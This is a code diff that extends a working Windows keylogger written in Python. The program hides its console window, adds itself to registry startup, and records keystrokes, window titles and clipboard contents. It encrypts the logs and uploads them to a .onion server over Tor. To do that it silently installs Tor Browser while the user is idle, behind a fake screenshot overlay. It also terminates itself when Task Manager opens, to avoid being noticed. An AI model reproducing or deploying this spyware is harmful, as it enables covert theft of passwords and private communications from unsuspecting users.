@@ -1,13 +1,43 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+import base64
+import ctypes
+import hashlib
+# for keyboard hooks. See docs https://github.com/boppreh/keyboard
+import multiprocessing
 import os
-import sys                 # for getting sys.argv
-import win32event, \
-       win32api, winerror  # for disallowing multiple instances
-import win32gui, \
-    win32console           # for getting window titles and hiding the console window
-import win32ui, win32con
+import random
+import signal
+import socket
+import stat
+import sys
+import threading
+import time
+import tkinter as tk
+from datetime import datetime, timedelta, date
 from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+
+import Cryptodome.Util
+import keyboard
+import numpy as np
+import psutil
+import pywinauto.timings
+import requests
+import socks
+import win32api
+import win32con
+import win32console
+import win32event
+import win32gui
+import win32ui
+import winerror
+from Cryptodome.Cipher import PKCS1_OAEP
+from Cryptodome.Hash import SHA3_512
+from Cryptodome.PublicKey import RSA
+from PIL import Image, ImageGrab, ImageTk
+from keyboard import is_pressed
+from pywinauto.application import Application
+from win32clipboard import OpenClipboard, CloseClipboard, GetClipboardData
 
 
 def hide():
@@ -32,33 +62,6 @@ mode = sys.argv[1]
 if mode != "debug":
     hide()
 
-from keyboard import is_pressed, hook, wait, get_hotkey_name  
-# for keyboard hooks. See docs https://github.com/boppreh/keyboard
-from psutil import pids as psutil_pids, Process as psutil_Process
-import signal
-from ctypes import WinDLL  # for getting window titles, current keyboard layout and capslock state
-import urllib.request
-import datetime            # for getting the current time and using timedelta
-from Cryptodome.PublicKey import RSA
-from Cryptodome.Cipher import PKCS1_OAEP
-import Cryptodome.Util
-from Cryptodome.Hash import SHA3_512
-import base64
-from hashlib import md5 as hashlib_md5             # for hashing the names of files
-from multiprocessing import Process as multiprocessing_Process
-from threading import Thread as threading_Thread
-from requests import get as requests_get, post as requests_post, exceptions as requests_exceptions
-import socks
-from socket import getfqdn as socket_getfqdn
-from random import choice, shuffle
-from pywinauto.application import Application
-import pywinauto.timings
-import tkinter as tk
-from PIL import Image, ImageGrab, ImageTk
-import numpy as np
-import re
-import time
-
 
 # Disallowing multiple instances
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
@@ -75,7 +78,7 @@ PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
 proxies = {'http': 'socks5h://127.0.0.1:9150',
            'https': 'socks5h://127.0.0.1:9150'}
 url_server_upload = "https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/upload"
-url_server_check_connection = "https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/check"
+hidden_service_check_connection = "https://3g2upl4pq6kufc4m.onion/"  #"https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/check"
 
 
 # Add to startup for persistence
@@ -132,14 +135,34 @@ public_key = bytes(public_key_str, 'utf-8')
 # (formula from Cryptodome.Cipher.PKCS1OAEP_Cipher.encypt)
 CHAR_LIMIT = Cryptodome.Util.number.ceil_div(Cryptodome.Util.number.size(RSA.importKey(public_key).n), 8) - \
              2 * SHA3_512.digest_size - 2
-CHAR_LIMIT -= 20          # a safe margin
 MINUTES_TO_LOG_TIME = 5   # this number of minutes must pass for the current time to be logged.
 
 # general check
 encryption_on = True if 'encrypt' in sys.argv else False
 
+
+def get_clipboard_value():
+    clipboard_value = None
+    try:
+        OpenClipboard()
+        clipboard_value = GetClipboardData()
+    except:
+        pass
+    CloseClipboard()
+    if clipboard_value:
+        if 0 < len(clipboard_value) < 300:
+            return clipboard_value
+
+
 line_buffer, window_name = '', ''
-time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
+
+clipboard_val = get_clipboard_value()
+if clipboard_val:
+    clipboard_logged = clipboard_val
+else:
+    clipboard_logged = ''
+
+time_logged = datetime.now() - timedelta(minutes=MINUTES_TO_LOG_TIME)
 count, backspace_buffer_len = 0, 0
 
 # Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
@@ -229,7 +252,7 @@ cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarus
 
 def detect_key_layout():
     global lcid_dict
-    user32 = WinDLL('user32', use_last_error=True)
+    user32 = ctypes.WinDLL('user32', use_last_error=True)
     curr_window = user32.GetForegroundWindow()
     thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
     klid = user32.GetKeyboardLayout(thread_id)
@@ -248,7 +271,7 @@ def detect_key_layout():
 
 def get_capslock_state():
     # using the answer here https://stackoverflow.com/a/21160382
-    hll_dll = WinDLL("User32.dll")
+    hll_dll = ctypes.WinDLL("User32.dll")
     vk = 0x14
     return True if hll_dll.GetKeyState(vk) == 1 else False
 
@@ -283,18 +306,17 @@ def encrypt(message_str):
     cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
     message = bytes(message_str, 'utf-8')
     # Use the public key for encryption
-    try:
-        ciphertext = cipher.encrypt(message)
-    except ValueError as e:
-        if e.args[0] == "Plaintext is too long.":
-            message = message[:CHAR_LIMIT - 5] + bytes("<...>", 'utf-8')
-            ciphertext = cipher.encrypt(message)
-        else:
-            raise e
-    del key
-    # Base 64 encode the encrypted message
-    encrypted_message = base64.b64encode(ciphertext)
-    return encrypted_message
+    if len(message) > CHAR_LIMIT:
+        ciphertext, curr_position = b'', 0
+        while curr_position < len(message):
+            ciphertext += b'\n---START---' + \
+                          base64.b64encode(cipher.encrypt(message[curr_position: curr_position + CHAR_LIMIT])) + \
+                          b'---END---\n'
+            curr_position += CHAR_LIMIT
+    else:
+        ciphertext = b'\n---START---' + base64.b64encode(cipher.encrypt(message)) + b'---END---\n'
+    del key, cipher
+    return ciphertext
 
 
 def check_internet():
@@ -303,18 +325,23 @@ def check_internet():
                   'taobao.com', 'login.tmall.com', 'wikipedia.org', 'yahoo.com', '360.cn', 'amazon.com', 'jd.com',
                   'weibo.com', 'sina.com.cn', 'live.com', 'pages.tmall.com', 'reddit.com', 'vk.com', 'netflix.com',
                   'blogspot.com', 'alipay.com', 'csdn.net', 'bing.com', 'yahoo.co.jp', 'Okezone.com', 'instagram.com',
-                  'google.com.hk', 'office.com']  # most popular websites in the world
+                  'google.com.hk', 'office.com']  # ~30 most popular websites in the world
+    random_protocol = random.choice(protocols)
     try:
-        random_protocol = choice(protocols)
-        random_site = choice(sites_list)
-        urllib.request.urlopen(random_protocol + random_site)
-        return True
+        r_status_code = requests.get(random_protocol + random.choice(sites_list)).status_code
+        if r_status_code == 200:
+            return True
+        else:
+            return False
     except:
         try:
             if random_protocol == 'https://':  # ensure switch to http (just in case)
                 random_protocol = 'http://'
-            urllib.request.urlopen(random_protocol + choice(sites_list))
-            return True
+            r_status_code = requests.get(random_protocol + random.choice(sites_list)).status_code
+            if r_status_code == 200:
+                return True
+            else:
+                return False
         except:
             return False
 
@@ -386,51 +413,61 @@ def detect_user_inactivity():
     seconds_inactive = 0
     screenshot_1 = ImageGrab.grab()
     mouse_saved_pos = win32api.GetCursorPos()
-    keys_saved_pressed = get_hotkey_name()
+    keys_saved_pressed = keyboard.get_hotkey_name()
     sleep = 20  # seconds
-    while seconds_inactive < 180:  # 3 minutes of mouse + keyboard + screen inactivity
-        screen_changed, screen_pic = has_screen_changed(screenshot_1)
-        mouse_pos, keys_pressed = win32api.GetCursorPos(), get_hotkey_name()
+    while seconds_inactive < sleep * 9:  # 3 minutes of mouse + keyboard + screen inactivity
+        time.sleep(sleep)
+        screen_changed, screenshot_1 = has_screen_changed(screenshot_1)
+        mouse_pos, keys_pressed = win32api.GetCursorPos(), keyboard.get_hotkey_name()
         if screen_changed or mouse_saved_pos != mouse_pos or keys_saved_pressed != keys_pressed:
             mouse_saved_pos, keys_saved_pressed = mouse_pos, keys_pressed
             seconds_inactive = 0
         else:
             seconds_inactive += sleep
-        time.sleep(sleep)
     return
 
 
 def install_tor_browser():
-    if not os.name == "nt":
-        return  # TODO: Linux, MacOS
+
     # 1. Download the installer
     try:
-        r = requests_get("http://www.torproject.org/download/")
+        r = requests.get("https://www.torproject.org/download/")
         if r.status_code == 200:
-            tor_windows_url = r.text.split(".exe")[0].split("href=\"")[-1] + ".exe"
+            tor_windows_url = "https://www.torproject.org" + r.text.split(".exe")[0].split("href=\"")[-1] + ".exe"
         else:
             tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
-    except requests_exceptions.ConnectionError:
+    except requests.exceptions.ConnectionError:
         tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
     try:
-        tor_installer = requests_get(tor_windows_url)
-    except requests_exceptions.ConnectionError:
+        tor_installer = requests.get(tor_windows_url)
+    except requests.exceptions.ConnectionError:
         return
     installer_path = os.path.join(dir_path, tor_windows_url.split("/")[-1])
+
+    # 1.1. Wait for user inactivity
+    detect_user_inactivity()
+    # 1.2. Write installer to the hard disk
     try: open(installer_path, 'wb').write(tor_installer.content)
     except: return
+
     # 2. Install
-    installation_dir = os.path.join(dir_path, "Tor_Browser")
-    if os.path.exists(installation_dir):
-        try: os.remove(installation_dir)
-        except: return
 
-    detect_user_inactivity()
-
-    screenshot_process = multiprocessing_Process(target=show_screenshot, args=())
+    screenshot_process = multiprocessing.Process(target=show_screenshot, args=())
     screenshot_process.start()
 
-    time.sleep(5)
+    time.sleep(15)
+
+    # remove existing files
+    installation_dir = os.path.join(dir_path, "Tor_Browser")
+    if os.path.exists(installation_dir):
+        try:
+            os.remove(installation_dir)
+        except:
+            try:
+                os.chmod(installation_dir, stat.S_IWRITE)
+                os.remove(installation_dir)
+            except:
+                return
 
     try:
         app = Application(backend="win32").start(installer_path)
@@ -449,8 +486,7 @@ def install_tor_browser():
             app.InstallDialog.children()[0]
             if type(app.InstallDialog.children()[0]) == pywinauto.controls.win32_controls.ButtonWrapper:
                 app.InstallDialog.children()[0].click()  # Overwrite - Yes
-        except:
-            pass
+        except: pass
     except pywinauto.timings.TimeoutError:
         app.kill()
         screenshot_process.terminate()
@@ -460,23 +496,34 @@ def install_tor_browser():
         app.InstallDialog.CheckBox2.wait('ready', timeout=120).uncheck()
         app.InstallDialog.FinishButton.wait('ready', timeout=30).click()
     except pywinauto.timings.TimeoutError:
-        app.kill()
+        try:
+            app.kill()
+        except:
+            pass
         screenshot_process.terminate()
         return
 
     screenshot_process.terminate()
 
     # 3. Remove the installer
-    os.remove(installer_path)
+    try:
+        os.remove(installer_path)
+    except:
+        try:
+            app.kill()
+            os.chmod(installer_path, stat.S_IWRITE)
+            os.remove(installer_path)
+        except:
+            pass
 
     return installation_dir
 
 
-def is_tor_browser_already_open(program_path):
-    for pid in psutil_pids():  # Iterates over all process-ID's found by psutil
+def is_program_already_open(program_path):
+    for pid in psutil.pids():  # Iterates over all process-ID's found by psutil
         try:
-            p = psutil_Process(pid)  # Requests the process information corresponding to each process-ID,
-            # the output wil look (for example) like this: <psutil_Process(pid=5269, name='Python') at 4320652312>
+            p = psutil.Process(pid)  # Requests the process information corresponding to each process-ID,
+            # the output wil look (for example) like this: <psutil.Process(pid=5269, name='Python') at 4320652312>
             if program_path in p.exe():  # checks if the value of the program-variable
                 # that was used to call the function matches the name field of the plutil.Process(pid)
                 # output (see one line above).
@@ -532,7 +579,7 @@ def find_top_windows(wanted_text=None, wanted_class=None, selection_function=Non
 
 
 def open_tor_browser(tor_installation_dir):
-    user32 = WinDLL('user32')
+    user32 = ctypes.WinDLL('user32')
     os.startfile(os.path.join(tor_installation_dir, "Start Tor Browser.lnk"))
     start_time = time.time()
     check_1 = check_2 = False
@@ -547,9 +594,33 @@ def open_tor_browser(tor_installation_dir):
             check_2 = True
             break
     if not (check_1 and check_2):
-        pid, _ = is_tor_browser_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
+        pid, _ = is_program_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
         if pid:
             os.kill(pid, 9)
+
+
+def get_my_ip():
+    server_parser_list = [(r'https://jsonip.com', "r.json()['ip']"),
+                          (r'https://ifconfig.co/json', "r.json()['ip']"),
+                          (r'https://ip.42.pl/raw', "r.text"),
+                          (r'https://httpbin.org/ip', "r.json()['origin'].split(", ")[0]"),
+                          (r'https://api.ipify.org/?format=json', "r.json()['ip']")]
+    random.shuffle(server_parser_list)
+    ip = ""
+    counter = 0
+    while counter < 5:
+        try:
+            r = requests.get(server_parser_list[counter][0])
+            if r.status_code == 200:
+                try:
+                    ip = eval(server_parser_list[counter][1])
+                    break
+                except:
+                    pass
+        except requests.exceptions.ConnectionError:
+            pass
+        counter += 1
+    return ip
 
 
 def find_the_previous_log_and_send():
@@ -559,68 +630,60 @@ def find_the_previous_log_and_send():
     found_filenames = []
     delta = 1
     while delta <= 366:
-        previous_date = (datetime.date.today() - timedelta(days=delta)).strftime('%Y-%b-%d')
-        previous_date_hashed = hashlib_md5(bytes(previous_date, 'utf-8')).hexdigest()
+        previous_date = (date.today() - timedelta(days=delta)).strftime('%Y-%b-%d')
+        previous_date_hashed = hashlib.md5(bytes(previous_date, 'utf-8')).hexdigest()
         if os.path.exists(previous_date_hashed + ".txt"):
             found_filenames.append(previous_date_hashed + ".txt")
         delta += 1
     # check if TOR is opened/installed
-    open_tor_pid, tor_installation_dir = is_tor_browser_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
+    open_tor_pid, tor_installation_dir = is_program_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
     if not tor_installation_dir:
         tor_installation_dir = check_if_tor_browser_is_installed()
     # if not tor_installation_dir:
-    tor_installation_dir = install_tor_browser()                                 # add indent
-    tor_installation_dir = os.path.split(os.path.split(tor_installation_dir)[0])[0]  # add indent
+    tor_installation_dir = install_tor_browser()                                     # TODO: add indent !!!
+    if tor_installation_dir:
+        tor_installation_dir = os.path.split(os.path.split(tor_installation_dir)[0])[0]  # cd .. & cd ..
     if not tor_installation_dir:
-        return True  # ONE DOES NOT SIMPLY USE CLEARNET.
+        return  # ONE DOES NOT SIMPLY USE CLEARNET.
     else:  # USE DARKNET ONLY
         if not open_tor_pid:
             open_tor_browser(tor_installation_dir)
         for found_filename in found_filenames:
             # Now that we found the old log files (found_filename), send them to our server.
-            server_parser_list = [(r'http://jsonip.com', "r.json()['ip']"),
-                                  (r'https://ifconfig.co/json', "r.json()['ip']"),
-                                  (r'http://ip.42.pl/raw', "r.text"),
-                                  (r'http://httpbin.org/ip', "r.json()['origin'].split(", ")[0]"),
-                                  (r'https://api.ipify.org/?format=json', "r.json()['ip']")]
-            shuffle(server_parser_list)
-            ip = ""
-            counter = 0
-            while counter < 5:
+            ip = get_my_ip()
+            new_found_filename = str(socket.getfqdn()) + ("_" if ip != "" else "") + ip + "_" + found_filename
+            os.rename(found_filename, new_found_filename)  # rename the file to avoid async errors (if second time)
+            try:
+                check_connection_status_code = requests.get(hidden_service_check_connection,
+                                                            proxies=proxies).status_code
+            except requests.exceptions.ConnectionError:
+                os.rename(new_found_filename, found_filename)  # rename the file back
+                return
+            if check_connection_status_code == 200:  # send logs
                 try:
-                    r = requests_get(server_parser_list[counter][0])
-                    if r.status_code == 200:
-                        ip = eval(server_parser_list[counter][1])
-                        break
-                except requests_exceptions.ConnectionError:
-                    pass
-                counter += 1
-            new_found_filename = str(socket_getfqdn()) + ("_" if ip != "" else "") + ip + "_" + found_filename
-            os.rename(found_filename, new_found_filename)  # rename the file to avoid async errors
-            sent_status_code = requests_get(url_server_check_connection, proxies=proxies).status_code
-            if sent_status_code == 200:  # send logs
-                uploaded_status = requests_post(url_server_upload,
-                                                proxies=proxies,
-                                                data=open(new_found_filename, "rb").read()).status_code
+                    uploaded_status = requests.post(url_server_upload,
+                                                    proxies=proxies,
+                                                    data=open(new_found_filename, "rb").read()).status_code
+                except requests.exceptions.ConnectionError:
+                    os.rename(new_found_filename, found_filename)  # rename the file back
+                    return
                 if uploaded_status == 200:
+                    os.chmod(new_found_filename, stat.S_IWRITE)
                     os.remove(new_found_filename)
-    return True
+    return
 
 
 def log_local():
     # Local mode
     global dir_path, line_buffer, backspace_buffer_len, window_name, time_logged
-    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
+    todays_date = date.today().strftime('%Y-%b-%d')
     # md5 only for masking dates - it's easily crackable for us:
-    todays_date_hashed = hashlib_md5(bytes(todays_date, 'utf-8')).hexdigest()
+    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
     # We need to check if it is a new day, if so, send the old log to the server.
     if not os.path.exists(todays_date_hashed + ".txt"):  # a new day, a new life...
-        if mode == "remote":
-            # Evaluate find_the_previous_log_and_send asynchronously
-            thr = threading_Thread(target=find_the_previous_log_and_send, args=(), kwargs={})
-            thr.start()
-            # thr.is_alive()  # check if it is alive
-            # thr.join()
+        # Evaluate find_the_previous_log_and_send asynchronously
+        thr = threading.Thread(target=find_the_previous_log_and_send, args=(), kwargs={})
+        thr.start()
     try:
         with open(os.path.join(dir_path, todays_date_hashed + ".txt"), "a") as fp:
             fp.write(line_buffer)
@@ -640,27 +703,35 @@ def log_debug():
 
 
 def log_it():
+    check_task_managers()
     global mode, line_buffer, encryption_on
     if encryption_on:
-        # line_buffer = line_buffer.decode('utf-8')
         line_buffer = encrypt(line_buffer).decode('utf-8')
-        line_buffer = '\n---START---' + line_buffer + '---END---\n'
     if mode == "local":
         log_local()
-    elif mode == "remote":
-        log_remote()
-    elif mode == "email":
-        email = TimerClass()
-        email.start()
-    elif mode == "ftp":
-        log_ftp()
     elif mode == 'debug':
         log_debug()
     return True
 
 
+def check_task_managers():
+    if is_program_already_open(program_path='Taskmgr.exe')[0]:
+        os.kill(os.getpid(), 9)
+        exit()
+    elif len(find_top_windows(wanted_text="task manager")) > 0:
+        os.kill(os.getpid(), 9)
+        exit()
+
+
 def key_callback(event):
-    global line_buffer, window_name, time_logged, upper_case, capslock_on, shift_on, backspace_buffer_len
+    keys_pressed = keyboard.get_hotkey_name()
+    is_pressed_ctrl = is_pressed('ctrl')
+    is_pressed_r_ctrl = is_pressed('right ctrl')
+    is_pressed_shift = is_pressed('shift')
+    is_pressed_r_shift = is_pressed('right shift')
+
+    global line_buffer, window_name, time_logged, clipboard_logged, upper_case, capslock_on, shift_on, \
+        backspace_buffer_len
 
     if event.event_type == 'up':
         if event.name in ['shift', 'right shift']:  # SHIFT UP
@@ -668,26 +739,33 @@ def key_callback(event):
             upper_case = update_upper_case()
         return True
 
-    window_buffer, time_buffer = '', ''
+    window_buffer, time_buffer, clipboard_buffer = '', '', ''
 
     # 1. Detect the active window change - if so, LOG THE WINDOW NAME
-    user32 = WinDLL('user32', use_last_error=True)
+    user32 = ctypes.WinDLL('user32', use_last_error=True)
     curr_window = user32.GetForegroundWindow()
     event_window_name = win32gui.GetWindowText(curr_window)
     if window_name != event_window_name:
-        window_buffer = '\n[WindowName: ' + event_window_name + ']: '  # update the line_buffer
+        window_buffer = '\n[WindowName: ' + event_window_name + ']: '
         window_name = event_window_name  # set the new value
 
     # 2. if MINUTES_TO_LOG_TIME minutes has passed - LOG THE TIME
-    now = datetime.datetime.now()
-    if now - time_logged > datetime.timedelta(minutes=MINUTES_TO_LOG_TIME):
-        time_buffer = '\n[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '  # update the line_buffer
+    now = datetime.now()
+    if now - time_logged > timedelta(minutes=MINUTES_TO_LOG_TIME):
+        time_buffer = '\n[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '
         time_logged = now  # set the new value
 
-    if time_buffer != "" or window_buffer != "":
+    # 3. if clipboard changed, log it
+    curr_clipboard = get_clipboard_value()
+    if curr_clipboard:
+        if curr_clipboard != clipboard_logged:
+            clipboard_buffer = '\n[Clipboard: ' + curr_clipboard + ']: '
+            clipboard_logged = curr_clipboard  # set the new value
+
+    if time_buffer != "" or window_buffer != "" or clipboard_buffer != "":
         if line_buffer != "":
-            log_it()  # log anything from old window / times
-        line_buffer = time_buffer + window_buffer  # value to begin with
+            log_it()  # log anything from old window / times / clipboard
+        line_buffer = time_buffer + window_buffer + clipboard_buffer  # value to begin with
         """ backspace_buffer_len = the number of symbols of line_buffer up until the last technical tag (including it) 
          - window name, time or key tags (<BACKSPACE>, etc.).
         len(line_buffer) - backspace_buffer_len = the number of symbols that we can safely backspace.
@@ -700,14 +778,18 @@ def key_callback(event):
     # 3. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
     if event.name in ['left', 'right']:  # arrow keys  # 'home', 'end', 'up', 'down'
         key_pressed_list = list()
-        if is_pressed('ctrl') or is_pressed('right ctrl'):
+        if is_pressed_ctrl or is_pressed_r_ctrl:
             key_pressed_list.append('ctrl')
-        if is_pressed('shift') or is_pressed('right shift'):
+        if is_pressed_shift or is_pressed_r_shift:
             key_pressed_list.append('shift')
         key_pressed = '<' + '+'.join(key_pressed_list) + (
             '+' if len(key_pressed_list) > 0 else '') + event.name + '>'
         line_buffer += key_pressed
         backspace_buffer_len = len(line_buffer)
+    elif event.name in ['ctrl', 'alt', 'delete']:
+        if keys_pressed == 'ctrl+alt+delete':
+            os.kill(os.getpid(), 9)
+            exit()
     elif event.name == 'space':
         key_pressed = ' '
     elif event.name in ['enter', 'tab']:
@@ -763,8 +845,11 @@ def key_callback(event):
 
 def main():
     # KEYLOGGER STARTS
-    hook(key_callback)
-    wait()
+    if not os.name == "nt":
+        return  # TODO: Linux, MacOS
+    check_task_managers()
+    keyboard.hook(key_callback)
+    keyboard.wait()
     return
 
 
